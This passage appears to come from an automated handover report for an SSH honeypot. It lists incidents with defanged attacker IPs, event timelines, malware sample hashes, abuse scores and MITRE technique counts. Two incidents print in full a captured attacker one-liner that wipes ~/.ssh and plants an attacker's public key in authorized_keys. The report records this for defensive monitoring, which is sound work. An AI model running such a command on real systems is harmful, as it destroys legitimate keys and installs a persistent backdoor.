| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 09:35:52` | `cowrie.session.connect` |
| `2026-06-03 09:35:52` | `cowrie.client.version` |
| `2026-06-03 09:35:52` | `cowrie.client.kex` |
| `2026-06-03 09:35:53` | `cowrie.login.success` |
| `2026-06-03 09:35:53` | `cowrie.session.params` |
| `2026-06-03 09:35:53` | `cowrie.command.input` |
| `2026-06-03 09:35:53` | `cowrie.command.failed` |
| `2026-06-03 09:35:53` | `cowrie.log.closed` |
| `2026-06-03 09:35:54` | `cowrie.session.params` |
| `2026-06-03 09:35:54` | `cowrie.command.input` |
| `2026-06-03 09:35:54` | `cowrie.session.file_download` |
| `2026-06-03 09:35:54` | `cowrie.log.closed` |
| `2026-06-03 09:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.252[.]168` to AbuseIPDB if not already reported
- [ ] Block `118.194.252[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb879b5a34e5

| Field | Detail |
|---|---|
| **Source IP** | `118.194.252[.]168` |
| **First Seen** | 2026-06-03 09:35 |
| **Last Seen** | 2026-06-03 09:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 09:35:56` | `cowrie.session.connect` |
| `2026-06-03 09:35:56` | `cowrie.client.version` |
| `2026-06-03 09:35:56` | `cowrie.client.kex` |
| `2026-06-03 09:35:57` | `cowrie.login.success` |
| `2026-06-03 09:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.252[.]168` to AbuseIPDB if not already reported
- [ ] Block `118.194.252[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a70464cf60f

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-06-03 11:00 |
| **Last Seen** | 2026-06-03 11:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:00:32` | `cowrie.session.connect` |
| `2026-06-03 11:00:32` | `cowrie.client.version` |
| `2026-06-03 11:00:33` | `cowrie.client.kex` |
| `2026-06-03 11:00:33` | `cowrie.login.success` |
| `2026-06-03 11:00:33` | `cowrie.session.params` |
| `2026-06-03 11:00:33` | `cowrie.command.input` |
| `2026-06-03 11:00:33` | `cowrie.command.failed` |
| `2026-06-03 11:00:34` | `cowrie.log.closed` |
| `2026-06-03 11:00:34` | `cowrie.session.params` |
| `2026-06-03 11:00:34` | `cowrie.command.input` |
| `2026-06-03 11:00:34` | `cowrie.session.file_download` |
| `2026-06-03 11:00:34` | `cowrie.log.closed` |
| `2026-06-03 11:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b10ae9cbc9

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-06-03 11:00 |
| **Last Seen** | 2026-06-03 11:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:00:36` | `cowrie.session.connect` |
| `2026-06-03 11:00:36` | `cowrie.client.version` |
| `2026-06-03 11:00:36` | `cowrie.client.kex` |
| `2026-06-03 11:00:37` | `cowrie.login.success` |
| `2026-06-03 11:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.6.227[.]209` | **31** | 2026-06-03 09:03 | 2026-06-03 09:39 | 60m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.166.10[.]244` | **30** | 2026-06-03 05:51 | 2026-06-03 06:55 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.188.177[.]46` | **30** | 2026-06-03 07:22 | 2026-06-03 08:23 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.0.238[.]206` | **30** | 2026-06-03 05:45 | 2026-06-03 06:58 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.114.69[.]235` | **16** | 2026-06-03 07:15 | 2026-06-03 07:37 | 26m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `166.62.42[.]127` | **11** | 2026-06-03 05:15 | 2026-06-03 09:30 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `31.173.247[.]254` | **6** | 2026-06-03 04:32 | 2026-06-03 05:23 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `185.39.204[.]145` | **5** | 2026-06-03 04:29 | 2026-06-03 04:50 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `27.79.42[.]241` | **5** | 2026-06-03 09:34 | 2026-06-03 09:37 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `14.224.213[.]222` | **4** | 2026-06-03 07:15 | 2026-06-03 07:31 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `13.89.125[.]24` | **2** | 2026-06-03 05:42 | 2026-06-03 05:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `177.16.244[.]39` | **2** | 2026-06-03 05:13 | 2026-06-03 05:23 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.224[.]91` | **2** | 2026-06-03 05:41 | 2026-06-03 05:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.100.156[.]227` | 1 | 2026-06-03 10:44 | 2026-06-03 10:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `106.13.114[.]161` | 1 | 2026-06-03 05:48 | 2026-06-03 05:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.142[.]171` | 1 | 2026-06-03 07:19 | 2026-06-03 07:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.180[.]139` | 1 | 2026-06-03 08:10 | 2026-06-03 08:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.34.65[.]169` | 1 | 2026-06-03 10:43 | 2026-06-03 10:43 | 31s | 0 | `T1592` | 🟢 LOW |
| `115.190.188[.]197` | 1 | 2026-06-03 07:29 | 2026-06-03 07:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.194.252[.]168` | 1 | 2026-06-03 09:35 | 2026-06-03 09:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.227.31[.]13` | 1 | 2026-06-03 09:00 | 2026-06-03 09:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.66.236[.]9` | 1 | 2026-06-03 08:41 | 2026-06-03 08:42 | 31s | 0 | `T1592` | 🟢 LOW |
| `122.199.107[.]20` | 1 | 2026-06-03 06:23 | 2026-06-03 06:24 | 13s | 0 | `T1592` | 🟢 LOW |
| `125.124.72[.]167` | 1 | 2026-06-03 09:08 | 2026-06-03 09:08 | 50s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]62` | 1 | 2026-06-03 09:32 | 2026-06-03 09:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]204` | 1 | 2026-06-03 08:11 | 2026-06-03 08:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]196` | 1 | 2026-06-03 06:17 | 2026-06-03 06:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.140.214[.]30` | 1 | 2026-06-03 05:06 | 2026-06-03 05:06 | 10s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]186` | 1 | 2026-06-03 10:13 | 2026-06-03 10:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]190` | 1 | 2026-06-03 10:14 | 2026-06-03 10:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]48` | 1 | 2026-06-03 10:14 | 2026-06-03 10:14 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]55` | 1 | 2026-06-03 10:13 | 2026-06-03 10:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]59` | 1 | 2026-06-03 10:16 | 2026-06-03 10:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `197.243.14[.]52` | 1 | 2026-06-03 09:01 | 2026-06-03 09:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.230.127[.]104` | 1 | 2026-06-03 11:00 | 2026-06-03 11:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.164.139[.]123` | 1 | 2026-06-03 08:28 | 2026-06-03 08:28 | 14s | 0 | `T1592` | 🟢 LOW |
| `43.247.250[.]115` | 1 | 2026-06-03 07:35 | 2026-06-03 07:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]134` | 1 | 2026-06-03 09:33 | 2026-06-03 09:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `8.154.0[.]104` | 1 | 2026-06-03 05:47 | 2026-06-03 05:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.154.4[.]21` | 1 | 2026-06-03 06:21 | 2026-06-03 06:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]251` | 1 | 2026-06-03 10:16 | 2026-06-03 10:16 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `125.124.72[.]167` | CN | CHINANET-ZJ Shaoxing node network | **100** ⚠️ | 0 |
| `106.13.180[.]139` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 5 |
| `195.184.76[.]59` | US | FR ONYPHE | **100** ⚠️ | 28 |
| `157.66.80[.]97` | VN | CLOUD WP Technology One Member LLC | **100** ⚠️ | 19 |
| `195.184.76[.]190` | US | FR ONYPHE | **100** ⚠️ | 26 |
| `121.227.31[.]13` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `66.132.224[.]91` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `66.132.172[.]134` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `112.6.227[.]209` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `122.199.107[.]20` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 231 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 126 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 80 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 40 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 40 |

---

## 🔕 False Positive Summary (54 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 41 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 6 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 336 cases |
| Tool 34  | Credential Extractor        | ✅ 232 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 54 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 54 filtered (16.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 80 priority case(s) shown individually · 41 recon entry/entries in table (13 group(s) consolidating 174 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-03T11:07:29Z_
